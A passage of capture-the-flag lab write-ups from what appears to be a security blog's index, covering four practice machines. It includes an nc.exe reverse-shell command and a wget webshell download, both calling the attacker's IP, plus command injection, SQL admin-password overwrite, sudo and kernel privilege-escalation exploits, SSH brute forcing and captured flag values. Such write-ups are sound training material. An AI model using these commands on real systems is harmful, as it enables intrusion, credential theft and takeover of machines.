unknown36968/tcp filtered unknown38126/tcp filtered unknown41223/tcp filtered unknown42028/tcp filtered unknown45085/tcp filtered unknown47945/tcp filtered unknown48801/tcp filtered unknown50885/tcp filtered unknown52750/tcp filtered unknownService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}{: file='Nmap_Result.txt'}## Web Enumeartion â¤µï¸I checked port 80 and redirected to `2million.htb` site , therefore I set the `/etc/hosts` file as the domain name that I got and loaded the site and this site is about Hackthebox looks interesing â†’![Untitled](TwoMillion/Untitled%201.png)Lets check the `invite` page and I have to find out how the invite code is working or generated â†’![Untitled](TwoMillion/Untitled%202.png)I checked its source code and I also got another source code in it as `/js/inviteapi.min.js` file â†’![Untitled](TwoMillion/Untitled%203.png)I checked the other .js file and this file is obfuscated so I used the deobfuscated online site to make it readable â†’```URLhttp://2million.htb/js/inviteapi.min.js```{: .nolineno}![Untitled](TwoMillion/Untitled%204.png)After deobfuscation of this code from [de4js](https://lelinhtinh.github.io/de4js/) Tool with eval option , I got this result â†’```jsxfunction verifyInviteCode(code) { var formData = { \"code\": code }; $.ajax({ type: \"POST\", dataType: \"json\", data: formData, url: '/api/v1/invite/verify', success: function (response) { console.log(response) }, error: function (response) { console.log(response) } })}function makeInviteCode() { $.ajax({ type: \"POST\", dataType: \"json\", url: '/api/v1/invite/how/to/generate', success: function (response) { console.log(response) }, error: function (response) { console.log(response) } })}```{: .nolineno}{: file='/js/inviteapi.min.js'}In this code I clearly see how code is generated so lets try it out â†’![Untitled](TwoMillion/Untitled%205.png)I decoded this in `ROT13` and as a result I got this â†’![Untitled](TwoMillion/Untitled%206.png)Lets go to `/api/v1/invite/generate` url â†’![Untitled](TwoMillion/Untitled%207.png)I got the invite code encoded as base64 â†’```{: .nolineno}31JEX-R97V8-RATI1-XIE4K```{: .nolineno}Letâ€™s use this invite code to register a user â†’![Untitled](TwoMillion/Untitled%208.png)Now lets login into `shiva` account â†’![Untitled](TwoMillion/Untitled%209.png)I got in as user `shiv` here with similar proccess into the dashboard â†’![Untitled](TwoMillion/Untitled%2010.png)I enumerated further tabs in this site but noluck so , I started working on URL access to get more data about the site â†’![Untitled](TwoMillion/Untitled%2011.png)Now lets move on to `v1` directory â†’![Untitled](TwoMillion/Untitled%2012.png)lets check the admin urls this look interesting â†’I got one hit from PUT request on this site `/api/v1/admin/settings/update` â†’![Untitled](TwoMillion/Untitled%2013.png)Lets move forword to provide what it wants â†’![Untitled](TwoMillion/Untitled%2014.png)Now lets set the is_admin as True or False or 1 or 0 as boolian value â†’![Untitled](TwoMillion/Untitled%2015.png)I think I got the admin access â†’![Untitled](TwoMillion/Untitled%2016.png)so lets check again the authentication as admin check â†’![Untitled](TwoMillion/Untitled%2017.png)so I am admin as a user `shiv` , so lets generate the vpn file as admin â†’```{: .nolineno}/api/v1/admin/vpn/generate```{: .nolineno}![Untitled](TwoMillion/Untitled%2018.png)Lets give what the response is asking for â†’![Untitled](TwoMillion/Untitled%2019.png)I can generate the VPN file with any username so it seams vulnerable to me so I tried different command injections and I got this â†’![Untitled](TwoMillion/Untitled%2020.png)I got it know command Injection Jai Ho !! , so lets have a reverse shell now â†’![Untitled](TwoMillion/Untitled%2021.png)Lets dig deeper to get to root user â†’After getting admin shell I checked the capability of commands that are set diffrently that can leads me to root and I got a hit on one â†’```bashadmin@2million:/$ getcap -r / 2>/dev/null/snap/core20/1891/usr/bin/ping cap_net_raw=ep/tmp/ovlcap/upper/magic =ep 41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63+ep/usr/bin/mtr-packet cap_net_raw=ep/usr/bin/ping cap_net_raw=ep/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=epadmin@2million:/$ which gcc/usr/bin/gccadmin@2million:/$```{: .nolineno}I searched on web related to `/tmp/ovlcap/upper/magic` exploit or any payload and I got one that is [OverlayFS Local Privesc](https://github.com/briskets/CVE-2021-3493/tree/main) which is based on **CVE-2021-3493** but it didâ€™t work so moved on to different exploit and also in a while I got some more info about the exploit from machine only through `/var/mail/admin` â†’```bashadmin@2million:/var/mail$ cat adminFrom: ch4p To: admin Cc: g0blin Subject: Urgent: Patch System OSDate: Tue, 1 June 2023 10:45:22 -0700Message-ID: X-Mailer: ThunderMail Pro 5.2Hey admin,I am know you are working as fast as you can to do the DB migration. While we are partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can not get popped by that.HTB Godfatheradmin@2million:/var/mail$```{: .nolineno}> So I looked for CVEs from this year and I got one **[CVE-2023-0386](https://github.com/sxlmnwb/CVE-2023-0386)** and its exploit also so lets use it I downloaded the zip file in attackers machine and transfered that zip file into the victim machine through wget command and python web server and then I unziped it and used as instructed in the exploit README.md file .{: .prompt-tip }![Untitled](TwoMillion/Untitled%2022.png)I am root now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Stealth", "url": "/posts/Stealth/", "categories": "TryHackMe", "tags": "File Upload, GodPotato, Windows, PrivEsc", "date": "2023-12-10 00:00:00 +0530", "snippet": "> TryHackme Medium Machine [Stealth](https://tryhackme.com/room/stealth){: .prompt-tip }## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Stealth]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN...", "content": "> TryHackme Medium Machine [Stealth](https://tryhackme.com/room/stealth){: .prompt-tip }## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Stealth]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.102.82[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-01 21:30 ISTNmap scan report for 10.10.102.82Host is up (0.18s latency).Not shown: 65520 filtered tcp ports (no-response)PORT STATE SERVICE VERSION139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?3389/tcp open ms-wbt-server Microsoft Terminal Services| ssl-cert: Subject: commonName=HostEvasion| Not valid before: 2023-07-28T19:06:15|_Not valid after: 2024-01-27T19:06:15| rdp-ntlm-info: | Target_Name: HOSTEVASION| NetBIOS_Domain_Name: HOSTEVASION| NetBIOS_Computer_Name: HOSTEVASION| DNS_Domain_Name: HostEvasion| DNS_Computer_Name: HostEvasion| Product_Version: 10.0.17763|_ System_Time: 2023-12-01T16:08:07+00:00|_ssl-date: 2023-12-01T16:08:44+00:00; +2s from scanner time.5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.08000/tcp open http PHP cli server 5.5 or later|_http-title: 404 Not Found8080/tcp open http Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)| http-open-proxy: Potentially OPEN proxy.|_Methods supported:CONNECTION|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28|_http-title: PowerShell Script Analyser8443/tcp open ssl/http Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28|_http-title: PowerShell Script Analyser| ssl-cert: Subject: commonName=localhost| Not valid before: 2009-11-10T23:48:47|_Not valid after: 2019-11-08T23:48:47| tls-alpn: |_ http/1.1|_ssl-date: TLS randomness does not represent time47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open unknown49668/tcp open msrpc Microsoft Windows RPC49669/tcp open msrpc Microsoft Windows RPC49676/tcp open msrpc Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required| smb2-time: | date: 2023-12-01T16:08:08|_ start_date: N/A|_clock-skew: mean: 1s, deviation: 0s, median: 1sService detection performed.```{: .nolineno}{: file='Nmap_Result.txt'}## Web Enumeration â¤µï¸I checked port 8080 first and got this upload file page â†’![Untitled](Stealth/Untitled%201.png)Now I searched online for the payload that can bypass the Antivirus and I found one â†’**[powershell-reverse-shell.ps1](https://github.com/martinsohn/PowerShell-reverse-shell/blob/main/powershell-reverse-shell.ps1)**Now I got the reverse shell through this payload â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Stealth]â””â”€$ nc -lvnp 8443listening on [any] 8443 ...connect to [10.8.83.156] from (UNKNOWN) [10.10.251.200] 49767SHELL> SHELL> whoamihostevasion\\evaderSHELL> hostnamewhoaHostEvasionSHELL> whoami /allUSER INFORMATION----------------User Name SID ================== =====================================hostevasion\\evader S-1-5-21-1966530601-3185510712-10604624-1022GROUP INFORMATION-----------------Group Name Type SID Attributes ====================================== ================ ============ ===========================================Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Remote Desktop Users Alias S-1-5-32-555 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\BATCH Well-known group S-1-5-3 Mandatory group, Enabled by default, Enabled groupCONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Local account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled groupLOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled groupMandatory Label\\Medium Mandatory Level Label S-1-16-8192 PRIVILEGES INFORMATION----------------------Privilege Name Description State ============================= ============================== =SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set DisabledSHELL>```{: .nolineno}After getting the shell lets look for the flag â†’I went to location `C:\\Users\\evader\\Desktop` â†’```bashSHELL> dir Directory: C:\\Users\\evader\\DesktopMode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 6/21/2016 3:36 PM 527 EC2 Feedback.website -a---- 6/21/2016 3:36 PM 554 EC2 Microsoft Windows Guide.website -a---- 8/3/2023 7:12 PM 194 encodedflag SHELL>```{: .nolineno}Now I accessed this encoded flag and it was base64 encoded so after decoding to that I got a path for it â†’```bashSHELL> cat encodedflag-----BEGIN CERTIFICATE-----WW91IGNhbiBnZXQgdGhlIGZsYWcgYnkgdmlzaXRpbmcgdGhlIGxpbmsgaHR0cDovLzxJUF9PRl9USElTX1BDPjo4MDAwL2FzZGFzZGFkYXNkamFramRuc2Rmc2Rmcy5waHA=-----END CERTIFICATE-----SHELL>```{: .nolineno}I used cyberchef Site to decode this encoded text â†’![Untitled](Stealth/Untitled%202.png)```bashhttp://:8000/asdasdadasdjakjdnsdfsdfs.php```{: .nolineno}![Untitled](Stealth/Untitled%203.png)For deleting the log files I went into that xampp server location to find the log file â†’```bashSHELL> dir Directory: C:\\xampp\\htdocs\\uploadsMode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/1/2023 5:10 PM 132 hello.ps1 -a---- 8/17/2023 4:58 AM 0 index.php -a---- 12/2/2023 3:11 PM 302 log.txt -a---- 12/2/2023 3:11 PM 1460 powershell-reverse-shell.ps1 -a---- 9/4/2023 3:18 PM 771 vulnerable.ps1 SHELL>```{: .nolineno}I found this log.txt file and I deleted it and refreshed the URL and I got the FLAG â†’![Untitled](Stealth/Untitled%204.png)Now for Privileges Escalation part I need to have more privileges and that privileges I canâ€™t find from this shell so I need to have a proper shell through webshell so I need to upload a webshell.php file to get another shell for the same user `envader` â†’```bashSHELL> wget -usebasicparsing http://10.8.83.156/webshell.php -o webshell.phpSHELL> dir Directory: C:\\xampp\\htdocsMode LastWriteTime Length Name ---- ------------- ------ ---- d----- 12/2/2023 3:20 PM uploads -a---- 8/17/2023 5:09 AM 5024 6xK3dSBYKcSV-LCoeQqfX1RYOo3qNa7lqDY.woff2 -a---- 7/16/2023 4:29 PM 213642 background-image.jpg -a---- 7/11/2023 5:11 PM 9711 background-image2.jpg -a---- 8/17/2023 5:11 AM 3554 font.css -a---- 8/29/2023 9:55 AM 3591 index.php -a---- 12/2/2023 3:23 PM 20327 webshell.php SHELL>```{: .nolineno}Lets have a webshell now â†’![Untitled](Stealth/Untitled%205.png)Now I have more privileges as compared to my SHELL access privileges â†’![Untitled](Stealth/Untitled%206.png)As I got `SeImpersonatePrivilege` enabled so Lets use `GodPotato` Tool here â†’![Untitled](Stealth/Untitled%207.png)I through Antivirus would not let me run this exploit but it does I donâ€™t understand why though but when I tried to have a reverse shell through nc.exe then it does not triggered â†’![Untitled](Stealth/Untitled%208.png)Now I noticed one `.exe` file on this xampp directory so lets use `UACME-Akagi64.exe` this file as our `GodPotato-NET4.exe` file â†’![Untitled](Stealth/Untitled%209.png)```powershellSHELL> mv UACME-Akagi64.exe UACME-Akagi64.exe.bak```{: .nolineno}Now lets replace or Godpotato with this executable file â†’![Untitled](Stealth/Untitled%2010.png)Now lets have a Administrator reverse shell â†’```powershellUACME-Akagi64.exe -cmd \"cmd /c C:\\xampp\\htdocs\\nc.exe 10.8.83.156 49666 -e cmd\"```{: .nolineno}![Untitled](Stealth/Untitled%2011.png)I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "My-CMSMS", "url": "/posts/My-CMSMS/", "categories": "Proving Grounds, Play", "tags": "CMS, Public Exploit, mysql, sudo exploit, PrivEsc", "date": "2023-12-10 00:00:00 +0530", "snippet": "> You can also find this machine on VulnHub : [My-CMSMS](https://www.vulnhub.com/entry/my-cmsms-1,498/){: .prompt-tip }## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/MY-CM...", "content": "> You can also find this machine on VulnHub : [My-CMSMS](https://www.vulnhub.com/entry/my-cmsms-1,498/){: .prompt-tip }## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/MY-CMSMS]â””â”€$ nmap -sC -sV -p- -T4 -oN Nmap_results.txt 192.168.171.74Nmap scan report for 192.168.171.74Host is up (0.00061s latency).Not shown: 65531 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 27219eb53963e91f2cb26bd33a5f317b (RSA)| 256 bf908aa5d7e5de89e61a36a193401857 (ECDSA)|_ 256 951f329578085045cd8c7c714ad46c1c (ED25519)80/tcp open http Apache httpd 2.4.38 ((Debian))3306/tcp open mysql MySQL 8.0.19| mysql-info: | Protocol: 10| Version: 8.0.19| Thread ID: 57| Capabilities flags: 65535| Some Capabilities: Support41Auth, DontAllowDatabaseTableColumn, ODBCClient, FoundRows, LongPassword, IgnoreSigpipes, SupportsTransactions, ConnectWithDatabase, SwitchToSSLAfterHandshake, InteractiveClient, LongColumnFlag, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, SupportsCompression, Speaks41ProtocolNew, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins| Status: Autocommit| Salt: \\x07\\x144\\x03\tn\\x7F5PA\\x11G\\x18q!\\x11SRL\\|_ Auth Plugin Name: mysql_native_password| ssl-cert: Subject: commonName=MySQL_Server_8.0.19_Auto_Generated_Server_Certificate| Not valid before: 2020-03-25T09:30:14|_Not valid after: 2030-03-23T09:30:14|_ssl-date: TLS randomness does not represent time33060/tcp open mysqlx?| fingerprint-strings: | DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: | Invalid message\"|_ HY0001 service unrecognized despite returning data.```{: .nolineno}{: file='Nmap_Result.txt'}## Web Enumeration â¤µï¸I checked port 80 on browser and I got a CMS running on it which is `CMS Made Simple version 2.2.13` â†’![Untitled](My-CMSMS/Untitled%201.png)Lets check mysql server which is open on default port 3306 , tried it with `root : root` and I got in â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/MY-CMSMS]â””â”€$ mysql -h 192.168.171.74 -u root -p Enter password: Welcome to the MariaDB monitor. Commands end with ; or \\g.Your MySQL connection id is 368Server version: 8.0.19 MySQL Community Server - GPLCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.MySQL [(none)]> show databases;+--------------------+| Database |+--------------------+| cmsms_db || information_schema || mysql || performance_schema || sys |+--------------------+5 rows in set (0.169 sec)MySQL [(none)]>```{: .nolineno}{: file='mysql'}I got the admin credentials through it â†’```sqlMySQL [cmsms_db]> select * from cms_users \\G;*************************** 1. row *************************** user_id: 1 username: admin password: 59f9ba27528694d9b3493dfde7709e70 admin_access: 1 first_name: last_name: email: admin@mycms.local active: 1 create_date: 2020-03-25 09:38:46modified_date: 2020-03-26 10:49:171 row in set (0.166 sec)ERROR: No query specifiedMySQL [cmsms_db]>```{: .nolineno}Lets Login into the CMS made simple site , I tired to decode this hash value but noluck from anywhere so I changed the password with my own MD5 hash value as this â†’![Untitled](My-CMSMS/Untitled%202.png)Now I set the `admin` password as `StrongShiv8` â†’```sqlMySQL [cmsms_db]> select * from cms_users \\G;*************************** 1. row *************************** user_id: 1 username: admin password: 59f9ba27528694d9b3493dfde7709e70 admin_access: 1 first_name: last_name: email: admin@mycms.local active: 1 create_date: 2020-03-25 09:38:46modified_date: 2020-03-26 10:49:171 row in set (0.170 sec)ERROR: No query specifiedMySQL [cmsms_db]> update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value -> FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'StrongShiv8'))) where username = 'admin';Query OK, 1 row affected (0.173 sec)Rows matched: 1 Changed: 1 Warnings: 0MySQL [cmsms_db]> select * from cms_users \\G;*************************** 1. row *************************** user_id: 1 username: admin password: 97fd6b919bf2ef743ca052e90c5dc693 admin_access: 1 first_name: last_name: email: admin@mycms.local active: 1 create_date: 2020-03-25 09:38:46modified_date: 2020-03-26 10:49:171 row in set (0.171 sec)ERROR: No query specifiedMySQL [cmsms_db]>```{: .nolineno}I used this query as it is encrypted the password as MD5 internally and save it in its location â†’```sqlupdate cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_valueFROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'StrongShiv8'))) where username = 'admin';```{: .nolineno}Now lets Login with `admin : StrongShiv8` credentials â†’![Untitled](My-CMSMS/Untitled%203.png)I now then followed this path â†’> [CMS Made Simple 2.2.15 - RCE (Authenticated)](https://www.exploit-db.com/exploits/49345){: .prompt-info }Through this path I got the reverse shell â†’ ![Untitled](My-CMSMS/Untitled%204.png)Lets see how can I get to root â†’```bashwww-data@mycmsms:/home/armour$ sudo -VSudo version 1.8.27Sudoers policy plugin version 1.8.27Sudoers file grammar version 46Sudoers I/O plugin version 1.8.27www-data@mycmsms:/home/armour$ which gcc/usr/bin/gcc```{: .nolineno}Since Sudo version is vulnerable so I used a exploit named as **[CVE-2021-3156 (Sudo Baron Samedit)](https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py)**```bashwww-data@mycmsms:/home/armour$ cd /tmpwww-data@mycmsms:/tmp$ wget http://192.168.45.226/exploit_nss.py--2023-12-03 03:54:59-- http://192.168.45.226/exploit_nss.pyConnecting to 192.168.45.226:80... connected.HTTP request sent, awaiting response... 200 OKLength: 8179 (8.0K) [text/x-python]Saving to: 'exploit_nss.py'exploit_nss.py 100%[===================>] 7.99K 33.6KB/s in 0.2s 2023-12-03 03:54:59 (33.6 KB/s) - 'exploit_nss.py' saved [8179/8179]www-data@mycmsms:/tmp$ chmod +x exploit_nss.py www-data@mycmsms:/tmp$ python3 exploit_nss.py # whoamiroot# iduid=0(root) gid=0(root) groups=0(root),33(www-data),1001(nagios),1002(nagcmd)# cd /root# ls -altotal 20drwx------ 4 root root 4096 Dec 3 01:23 .drwxr-xr-x 18 root root 4096 Jun 29 2020 ..-rw------- 1 root root 0 Sep 1 2020 .bash_history-rw-r--r-- 1 root root 0 Aug 20 2020 .bashrcdrwx------ 3 root root 4096 Mar 25 2020 .gnupg-rw-r--r-- 1 root root 0 Aug 20 2020 .profile-rw-r--r-- 1 root root 0 Aug 20 2020 .selected_editordrwxr-xr-x 2 root root 4096 Mar 25 2020 .ssh-rw-r--r-- 1 root root 33 Dec 3 01:23 proof.txt# cat proof.txt737f884a55516fa1c1e64a69e7e7dc87# cd /var/www# ls -altotal 16drwxr-xr-x 3 root root 4096 Aug 14 2020 .drwxr-xr-x 12 root root 4096 Mar 25 2020 ..drwxr-xr-x 10 root root 4096 May 31 2020 html-rw-r--r-- 1 www-data www-data 33 Dec 3 01:23 local.txt# cat local.txt5ade5f099864c2f0f02d08cf9b63aabe# ip a1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever3: ens160: mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 00:50:56:ba:77:da brd ff:ff:ff:ff:ff:ff inet 192.168.171.74/24 brd 192.168.171.255 scope global ens160 valid_lft forever preferred_lft forever inet6 fe80::250:56ff:feba:77da/64 scope link valid_lft forever preferred_lft forever# hostnamemycmsms# iduid=0(root) gid=0(root) groups=0(root),33(www-data),1001(nagios),1002(nagcmd)# whoamiroot#```{: .nolineno}I am root now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Moneybox", "url": "/posts/Moneybox/", "categories": "Proving Grounds, Play", "tags": "FTP, Password Bruteforce, PrivEsc, perl", "date": "2023-12-10 00:00:00 +0530", "snippet": "> You can also find this machine on VulnHub : [Moneybox](https://www.vulnhub.com/entry/moneybox-1,653/){: .prompt-tip }## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Money...", "content": "> You can also find this machine on VulnHub : [Moneybox](https://www.vulnhub.com/entry/moneybox-1,653/){: .prompt-tip }## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Moneybox]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 192.168.171.230 [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-03 14:39 ISTWarning: 192.168.171.230 giving up on port because retransmission cap hit (6).Nmap scan report for 192.168.171.230Host is up (0.16s latency).Not shown: 65481 closed tcp ports (reset), 51 filtered tcp ports (no-response)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:192.168.45.226| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 1| vsFTPd 3.0.3 - secure, fast, stable|_End of status| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_-rw-r--r-- 1 0 0 1093656 Feb 26 2021 trytofind.jpg22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 1e:30:ce:72:81:e0:a2:3d:5c:28:88:8b:12:ac:fa:ac (RSA)| 256 01:9d:fa:fb:f2:06:37:c0:12:fc:01:8b:24:8f:53:ae (ECDSA)|_ 256 2f:34:b3:d0:74:b4:7f:8d:17:d2:37:b1:2e:32:f7:eb (ED25519)80/tcp open http Apache httpd 2.4.38 ((Debian))|_http-server-header: Apache/2.4.38 (Debian)|_http-title: MoneyBoxService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}{: file='Nmap_Result.txt'}## FTP Enumeration â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Moneybox]â””â”€$ ftp 192.168.171.230 21Connected to 192.168.171.230.220 (vsFTPd 3.0.3)Name (192.168.171.230:kali): Anonymous331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp> ls -al229 Entering Extended Passive Mode (|||49427|)150 Here comes the directory listing.drwxr-xr-x 2 0 0 4096 Feb 26 2021 .drwxr-xr-x 2 0 0 4096 Feb 26 2021 ..-rw-r--r-- 1 0 0 1093656 Feb 26 2021 trytofind.jpg226 Directory send OK.ftp> get trytofind.jpglocal: trytofind.jpg remote: trytofind.jpg229 Entering Extended Passive Mode (|||13549|)150 Opening BINARY mode data connection for trytofind.jpg (1093656 bytes).100% |**********************************************************************************| 1068 KiB 445.51 KiB/s 00:00 ETA226 Transfer complete.1093656 bytes received in 00:02 (418.18 KiB/s)ftp> exit221 Goodbye.```{: .nolineno}## Web Enumeration â¤µï¸I cheched port 80 and got some hints through directory or files bruteforcing also like from `/blogs` â†’![Untitled](Moneybox/Untitled%201.png)Now the `/blogs` page â†’![Untitled](Moneybox/Untitled%202.png)while checking source code I got a hint â†’![Untitled](Moneybox/Untitled%203.png)Now I also got another hint through this one â†’![Untitled](Moneybox/Untitled%204.png)I knew that this secret key will be used in extracting some data from that image file that I got from FTP enum â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Moneybox]â””â”€$ steghide extract -sf trytofind.jpgEnter passphrase: wrote extracted data to \"data.txt\". â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Moneybox]â””â”€$ cat data.txt Hello..... renu I tell you something Important.Your Password is too Week So Change Your PasswordDo not Underestimate it.......```{: .nolineno}I then ran hydra Tool to bruteforce the password for user renu for SSH connection â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Moneybox]â””â”€$ hydra -l renu -P /usr/share/wordlists/rockyou.txt ssh://192.168.171.230 -t 64 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-03 14:45:38[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task[DATA] attacking ssh://192.168.171.230:22/[22][ssh] host: 192.168.171.230 login: renu password: 9876543211 of 1 target successfully completed, 1 valid password found[WARNING] Writing restore file because 23 final worker threads did not complete until end.[ERROR] 23 targets did not resolve or could not be connected[ERROR] 0 target did not complete```{: .nolineno}## SSH Login â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Moneybox]â””â”€$ ssh renu@192.168.171.230 The authenticity of host '192.168.171.230 (192.168.171.230)' can not be established.ED25519 key fingerprint is SHA256:4skFgbTuZiVgZGtWwAh5WRXgKXTdP7U5BhYUsIg9nWw.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '192.168.171.230' (ED25519) to the list of known hosts.renu@192.168.171.230 ispassword: Linux MoneyBox 4.19.0-22-amd64 #1 SMP Debian 4.19.260-1 (2022-09-29) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Fri Sep 23 10:00:13 2022renu@MoneyBox:~$ renu@MoneyBox:~$ ls -altotal 40drwxr-xr-x 5 renu renu 4096 Oct 11 2022 .drwxr-xr-x 4 root root 4096 Feb 26 2021 ..-rw------- 1 renu renu 642 Feb 26 2021 .bash_history-rw-r--r-- 1 renu renu 220 Apr 17 2019 .bash_logout-rw-r--r-- 1 renu renu 3526 Apr 17 2019 .bashrcdrwxr-xr-x 3 root root 4096 Feb 26 2021 ftpdrwxr-xr-x 3 renu renu 4096 Feb 26 2021 .local-rw-r--r-- 1 root root 33 Dec 3 01:07 local.txt-rw-r--r-- 1 renu renu 807 Apr 17 2019 .profiledrwx------ 2 renu renu 4096 Feb 26 2021 .sshrenu@MoneyBox:~$ cat local.txt1e6983bc9cccc471cf683a1ee3edc60erenu@MoneyBox:~$```{: .nolineno}### Lateral Moverment â¤µï¸For changing the user to Lily I found some info from .bash_history file of renu â†’```bashrenu@MoneyBox:~$ cat .bash_history......chmod 400 id_rsals -lssh -i id_rsa lily@192.168.43.80clearssh -i id_rsa lily@192.168.43.80cdclearcd .ssh/lsssh -i id_rsa lily@192.168.43.80su lilyclearcd......```{: .nolineno}{: file='.bash_history'}So I tried to login as Lily with the private keys of renu â†’```bashrenu@MoneyBox:~$ cd .sshrenu@MoneyBox:~/.ssh$ ls -altotal 20drwx------ 2 renu renu 4096 Feb 26 2021 .drwxr-xr-x 5 renu renu 4096 Oct 11 2022 ..-r-------- 1 renu renu 1823 Feb 26 2021 id_rsa-rw-r--r-- 1 renu renu 393 Feb 26 2021 id_rsa.pub-rw-r--r-- 1 renu renu 222 Feb 26 2021 known_hostsrenu@MoneyBox:~/.ssh$ 